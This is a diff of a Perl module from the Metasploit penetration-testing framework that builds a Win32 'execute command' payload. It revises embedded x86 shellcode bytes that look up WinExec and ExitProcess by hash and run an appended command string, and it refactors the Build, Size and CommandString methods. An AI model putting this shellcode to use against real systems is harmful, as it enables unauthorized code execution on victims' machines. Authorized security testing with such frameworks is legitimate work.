@@ -1,18 +1,18 @@
 package Msf::PayloadComponent::Win32Execute;
 use strict;
 use base 'Msf::PayloadComponent::Win32Payload';
-sub load {
-  Msf::PayloadComponent::Win32Payload->import('Msf::PayloadComponent::NoConnection');
+
+sub import {
+  my $class = shift;
+  $class->SUPER::import(@_);
 }
 
 my $info =
 {
     'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
     'Arch'         => [ 'x86' ],
-    'Priv'         => 0,
+    'Priv'         => 1,
     'OS'           => [ 'win32' ],
-    'Multistage'   => 0,
-    'Size'         => '',
     'Win32Payload' =>
     {
         Offsets => { 'EXITFUNC' => [133, 'V'] },
@@ -24,29 +24,39 @@ my $info =
         "\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8".
         "\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64".
         "\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x8e".
-        "\x4e\x0e\xec\xff\xd6\x89\xc7\xeb\x16\x53\x68\x98\xfe\x8a\x0e\xff".
-        "\xd6\xff\xd0\x53\x68\x7e\xd8\xe2\x73\xff\xd6\x6a\x00\xff\xd0\x6a".
-        "\x00\xe8\xe3\xff\xff\xff",       
+        "\x4e\x0e\xec\xff\xd6\x89\xc7\xeb\x18\x53\x68\x98\xfe\x8a\x0e\xff".
+        "\xd6\xff\xd0\x53\x68\x7e\xd8\xe2\x73\xff\xd6\x6a\x00\xff\xd0\xff".
+        "\xd0\x6a\x00\xe8\xe1\xff\xff\xff", 
     },
 };
 
+
 sub new {
-    load();
-    my $class = shift;
-    my $hash = @_ ? shift : { };
-    $hash = $class->MergeHash($hash, {'Info' => $info});
-    my $self = $class->SUPER::new($hash, @_);
-
-    $self->{WinExecCmd};
-    return($self);
-}
-
-sub Size {
-    my $self = shift;
-    return ($self->SUPER::Size($self) + length($self->{WinExecCmd}) + 1);
+  my $class = shift;
+  my $hash = @_ ? shift : { };
+  $hash = $class->MergeHash($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+  return($self);
 }
 
 sub Build {
-    my $self = shift;
-    return ($self->SUPER::Build($self).$self->{WinExecCmd}."\x00");
+  my $self = shift;
+  my $commandString = $self->CommandString;
+  $self->PrintDebugLine(3, "WinExec CMD: $commandString");
+  return($self->SUPER::Build . $commandString . "\x00");
+}
+
+sub CommandString {
+  my $self = shift;
+  return;
+}
+
+sub Size {
+  my $self = shift;
+  return($self->SUPER::Size + length($self->CommandString) + 1);
+}
+
+
+sub Loadable {
+  return(1);
 }
